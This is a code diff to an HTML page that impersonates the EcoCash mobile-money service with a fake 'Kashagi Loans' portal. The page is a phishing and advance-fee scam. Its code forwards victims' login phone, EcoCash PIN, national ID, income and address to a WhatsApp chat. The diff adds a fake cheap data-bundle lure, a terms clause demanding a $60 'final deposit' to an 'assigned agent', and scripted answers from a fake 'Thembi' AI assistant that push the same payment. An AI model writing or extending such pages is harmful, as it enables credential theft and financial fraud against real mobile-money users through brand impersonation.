@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash Super App - Kashagi Loans</title>
+    <title>EcoCash Super App - Kashagi Loans & Data Bundles</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome for icons -->
@@ -47,6 +47,14 @@
         }
         .processing-pulse {
             animation: pulse-ring 1.5s infinite ease-in-out;
+        }
+        @keyframes float-banner {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-4px); }
+            100% { transform: translateY(0px); }
+        }
+        .banner-float {
+            animation: float-banner 4s ease-in-out infinite;
         }
     </style>
 </head>
@@ -318,7 +326,7 @@
             <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
                 <div>
                     <!-- Client Profile Banner with Smart Card Graphic -->
-                    <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-5 relative overflow-hidden">
+                    <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-4 relative overflow-hidden">
                         <div class="absolute right-[-10px] bottom-[-10px] opacity-20 text-6xl">
                             <i class="fa-solid fa-credit-card"></i>
                         </div>
@@ -333,21 +341,45 @@
                         </div>
                     </div>
 
-                    <div class="text-center mb-5">
+                    <!-- PROMOTIONAL BANNER: 28GB for $10 USD (Browse for 30 Days) -->
+                    <div class="mb-4 bg-gradient-to-r from-ecodarkblue via-blue-600 to-indigo-600 rounded-xl p-4 text-white shadow-lg relative overflow-hidden banner-float border border-blue-400/30">
+                        <div class="absolute right-[-20px] bottom-[-20px] opacity-15 text-8xl pointer-events-none">
+                            <i class="fa-solid fa-wifi"></i>
+                        </div>
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="bg-ecored text-white text-[10px] font-extrabold px-2.5 py-0.5 rounded-full uppercase tracking-wider shadow-sm animate-pulse">🔥 Super Bundle Offer</span>
+                            <span class="text-[10px] text-blue-200 font-semibold"><i class="fa-regular fa-clock"></i> Limited Time</span>
+                        </div>
+                        
+                        <div class="flex items-center space-x-3 mb-3">
+                            <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=200&q=80" alt="People browsing internet" class="w-14 h-14 rounded-lg object-cover border-2 border-white/80 shadow flex-shrink-0">
+                            <div>
+                                <h3 class="text-base font-extrabold text-white leading-snug">Buy 28GB for only $10 USD</h3>
+                                <p class="text-xs text-blue-100 font-medium">Browse, stream & work seamlessly for <span class="font-bold text-yellow-300">30 Days</span>!</p>
+                            </div>
+                        </div>
+
+                        <button onclick="buyBundlePromo('28GB for $10 USD (30 Days)')" class="w-full bg-white text-ecoblue hover:bg-yellow-300 hover:text-gray-900 font-extrabold py-2 px-3 rounded-lg text-xs uppercase tracking-wider transition shadow flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-cart-shopping"></i>
+                            <span>BUY NOW VIA WHATSAPP</span>
+                        </button>
+                    </div>
+
+                    <div class="text-center mb-4">
                         <span class="bg-green-100 text-green-800 text-[10px] font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">Super App Active Portal</span>
-                        <h2 class="text-lg font-extrabold text-gray-800 mt-2">Qualify for Kashagi Loans Today</h2>
-                        <p class="text-xs text-gray-500 mt-0.5">Select your preferred credit service below</p>
+                        <h2 class="text-base font-extrabold text-gray-800 mt-1.5">Qualify for Kashagi Loans Today</h2>
+                        <p class="text-[11px] text-gray-500">Select your preferred credit service below</p>
                     </div>
 
                     <!-- Visual Cards for Services -->
-                    <div class="space-y-4">
+                    <div class="space-y-3">
                         <div onclick="switchTab('boost-form')" class="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
-                            <div class="h-28 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=400&q=80');">
-                                <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-3">
+                            <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=400&q=80');">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> <span>Instant Credit Boost</span></span>
                                 </div>
                             </div>
-                            <div class="p-3.5 flex items-center justify-between">
+                            <div class="p-3 flex items-center justify-between">
                                 <div>
                                     <h4 class="font-bold text-sm text-gray-800 group-hover:text-ecoblue">Boost My Kashagi Loans</h4>
                                     <p class="text-[11px] text-gray-500">Upgrade existing credit limit instantly</p>
@@ -357,12 +389,12 @@
                         </div>
 
                         <div onclick="switchTab('apply-form')" class="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
-                            <div class="h-28 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=400&q=80');">
-                                <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-3">
+                            <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=400&q=80');">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-file-invoice-dollar text-green-400"></i> <span>Full Zimbabwe Registration</span></span>
                                 </div>
                             </div>
-                            <div class="p-3.5 flex items-center justify-between">
+                            <div class="p-3 flex items-center justify-between">
                                 <div>
                                     <h4 class="font-bold text-sm text-gray-800 group-hover:text-supergreen">Apply / Register Kashagi Loan</h4>
                                     <p class="text-[11px] text-gray-500">New loan application with 10% collateral</p>
@@ -373,7 +405,7 @@
                     </div>
                 </div>
 
-                <div class="text-center py-4 text-xs font-semibold text-gray-600">
+                <div class="text-center py-3 text-xs font-semibold text-gray-600">
                     ©2026 EcoCash Super App
                 </div>
             </section>
@@ -500,15 +532,16 @@
                         <p>2. Privacy and Data Protection: EcoCash is deeply committed to protecting your personal information. All submitted national identification credentials, phone numbers, and PIN data are encrypted with bank-grade 256-bit protocols, strictly adhering to national data privacy regulations.</p>
                         <p>3. Safety and Fraud Prevention: Your account security is paramount. Never share your 4-digit EcoCash PIN or password with any third party, customer care agent, or unauthorized personnel. EcoCash will never ask for your PIN over phone calls or messages.</p>
                         <p>4. Loan Repayment and Collateral: All disbursed Kashagi loan credit lines require upfront collateral activation fees (5% for boost tiers or 10% for full new applications) prior to wallet disbursement. Repayments are automatically debited on maturity.</p>
-                        <p>5. Default Consequences: Failure to clear outstanding loan balances on time results in credit score penalties, temporary wallet restriction, and potential debt recovery through registered mobile subscriber lines.</p>
-                        <p class="font-semibold text-ecoblue">6. Final Acceptance: By checking the agreement box below and clicking submit, you certify that all entered profile data is accurate and you consent to our security guidelines.</p>
+                        <p class="font-semibold text-ecored bg-red-50 p-2 rounded border border-red-200">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly $60 USD. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification.</p>
+                        <p>6. Default Consequences: Failure to clear outstanding loan balances on time results in credit score penalties, temporary wallet restriction, and potential debt recovery through registered mobile subscriber lines.</p>
+                        <p class="font-semibold text-ecoblue">7. Final Acceptance: By checking the agreement box below and clicking submit, you certify that all entered profile data is accurate and you consent to our security guidelines.</p>
                     </div>
 
                     <!-- Explicit Agree Checkbox -->
                     <div class="bg-white border border-blue-200 rounded-lg p-3 mt-3 flex items-start space-x-2 shadow-sm">
                         <input type="checkbox" id="explicit-agree-checkbox" onchange="toggleAgreeCheckbox()" class="mt-0.5 w-4 h-4 rounded text-ecoblue focus:ring-ecoblue cursor-pointer flex-shrink-0">
                         <label for="explicit-agree-checkbox" class="text-[11px] text-gray-800 font-medium leading-tight cursor-pointer">
-                            I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines.
+                            I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines, including the $60 USD final deposit requirement with my assigned agent.
                         </label>
                     </div>
                 </div>
@@ -723,7 +756,7 @@
                 <div id="chat-messages" class="flex-1 p-3 overflow-y-auto space-y-3 bg-gray-50 text-xs">
                     <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 space-y-1">
                         <p class="font-semibold text-ecoblue">Hello! I am Thembi, your EcoCash AI assistant.</p>
-                        <p class="text-gray-600">Select any question below or ask me anything regarding Kashagi Loans!</p>
+                        <p class="text-gray-600">Select any question below or ask me anything regarding Kashagi Loans and Data Bundles!</p>
                     </div>
                 </div>
 
@@ -776,6 +809,16 @@
         // 10 Client FAQ questions structured into TWO clear, readable parts for Ask Thembi AI
         const thembiFAQs = [
             { 
+                q: "What is the final $60 USD deposit requirement?", 
+                part1: "Part 1: Account Activation Deposit — Once your account and credit tier have been successfully updated, clients are required to make a final deposit of $60 USD.", 
+                part2: "Part 2: Spending Activation — After completing this deposit with your personally assigned agent via WhatsApp, your account is fully activated for spending." 
+            },
+            { 
+                q: "How do I buy the 28GB for $10 USD bundle?", 
+                part1: "Part 1: Instant Purchase — Click the 'BUY NOW VIA WHATSAPP' button on our promotional banner to instantly initiate your 28GB bundle request.", 
+                part2: "Part 2: Activation — Complete your payment via EcoCash wallet and your 30-day internet bundle will be credited immediately." 
+            },
+            { 
                 q: "How do I qualify for Kashagi Loans?", 
                 part1: "Part 1: Account Requirements — Ensure your EcoCash wallet is active, your phone number starts with +263, and you have at least 6 months of active transaction history.", 
                 part2: "Part 2: Identity Verification — Provide an authentic Zimbabwe National ID and complete your profile registration successfully." 
@@ -814,16 +857,6 @@
                 q: "How do I contact customer support?", 
                 part1: "Part 1: Direct Helpline — You can reach customer care instantly by dialing short code 114 or calling our main office line at +263 772 023 000.", 
                 part2: "Part 2: WhatsApp Assistance — You can also click our WhatsApp widget anytime to chat directly with our support team." 
-            },
-            { 
-                q: "Why is transaction history validation necessary?", 
-                part1: "Part 1: Financial Health Check — Reviewing your last 6 months of transactions helps us assess your cash flow and repayment reliability.", 
-                part2: "Part 2: Tier Determination — This history allows us to recommend the ideal Kashagi credit tier limit suited for your financial needs." 
-            },
-            { 
-                q: "Can I upgrade my tier more than once?", 
-                part1: "Part 1: Progressive Upgrades — Yes! Every time you successfully repay your Kashagi loan on time, your credit profile strengthens.", 
-                part2: "Part 2: Higher Limits — You become eligible to upgrade progressively to higher credit tiers all the way up to $3,000 USD." 
             }
         ];
 
@@ -916,10 +949,16 @@
             input.value = '';
             let matched = thembiFAQs.find(f => f.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(f.q.toLowerCase()));
             
-            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all Kashagi loan questions and account upgrades, our system is designed to guide you securely step by step.";
+            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all Kashagi loan questions and account updates, our system is designed to guide you securely step by step.";
             let p2 = matched ? matched.part2 : "Part 2: Support Assistance — You can also reach our customer care team via WhatsApp or dial 114 for immediate help.";
 
             askThembiQuestion(query, p1, p2);
+        }
+
+        // Direct WhatsApp redirection for Promotional Bundle Buy Now
+        function buyBundlePromo(bundleTitle) {
+            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Ready for instant activation and payment via WhatsApp!`;
+            openWhatsAppChat(message);
         }
 
         // Validate Zimbabwe National ID format e.g. 63-1234567A89
@@ -1205,10 +1244,10 @@
             let message = '';
             
             if (clientData.flowType === 'boost') {
-                message = `*EcoCash Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Correct Credentials Verified & Terms Agreed`;
+                message = `*EcoCash Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Correct Credentials Verified & Terms Agreed`;
             } else {
                 const collateralFee = (parseFloat(clientData.applyLoanAmount || 0) * 0.10).toFixed(2);
-                message = `*EcoCash Kashagi Loan Full Application*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🏠 *Residential Address:* ${clientData.applyAddress}\n💰 *Requested Loan Amount:* $${clientData.applyLoanAmount} USD\n🛡️ *Collateral Fee (10%):* $${collateralFee} USD\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Full Application & Terms Agreed`;
+                message = `*EcoCash Kashagi Loan Full Application*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🏠 *Residential Address:* ${clientData.applyAddress}\n💰 *Requested Loan Amount:* $${clientData.applyLoanAmount} USD\n🛡️ *Collateral Fee (10%):* $${collateralFee} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Full Application & Terms Agreed`;
             }
 
             openWhatsAppChat(message);
@@ -1390,3 +1429,4 @@
     </script>
 </body>
 </html>
+
